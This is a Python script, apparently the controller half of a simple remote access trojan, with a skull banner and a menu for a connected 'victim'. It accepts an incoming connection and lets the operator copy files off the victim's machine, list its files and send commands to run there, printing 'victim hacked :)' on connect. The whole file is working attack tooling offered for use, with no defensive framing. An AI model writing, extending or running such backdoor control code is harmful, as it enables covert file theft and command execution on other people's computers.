import socket
from colorama import *

print(Fore.GREEN + '''
      :                     :
     ::                    :::
    '::                   ::::
    '::::.     .....:::.:::::::
    '::::::::::::::::::::::::::::
    ::::::XUWWWWWU:::::XW$$$$$$WX:
    ::::X$$$$$$$$$$W::X$$$$$$$$$$Wh
   ::::t$$$$$$$$$$$$W:$$$$$$P*$$$$M::
   :::X$$$$$$""""$$$$X$$$$$   ^$$$$X:::
  ::::M$$$$$$    ^$$$RM$$$L    <$$$X::::
.:::::M$$$$$$     $$$R:$$$$.   d$$R:::`
'~::::::?$$$$$$...d$$$X$6R$$$$$$$$RXW$X:'`
 '~:WNWUXT#$$$$$$$$TU$$$$W6IBBIW@$$RX:
  `~
''')
boss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("socket created....................")
boss.bind(("127.0.0.1", 900))
print("sever is ready....................")
boss.listen(3)
victim, ipaddress = boss.accept()
print("victim hacked :)", ipaddress[0])
try:
    while True:
        print("1.file\n2.list\n3.command")
        order = input("Enter your order: ")
        if order == "1":
            victim.send(order.encode())
            print(victim.recv(1024).decode())
            FileName = input("Enter the file name of your choice: ")
            victim.send(FileName.encode())
            data = victim.recv(1250000)
            file = open(FileName.split(".")[0] + "1." + FileName.split(".")[1], "wb")
            file.write(data)
            file.close()
        elif order == "2":
            victim.send(order.encode())
            print("victim file list: "+victim.recv(1500).decode())
        elif order == "3":
            victim.send(order.encode())
            a=input(victim.recv(1024).decode())
            victim.send(a.encode())
            print(victim.recv(1024).decode())
        else:
            message=input("enter your massage:")
            victim.send(message.encode())
except:
    print(victim.recv(1024))
    print("coction faild...............")
    victim.close()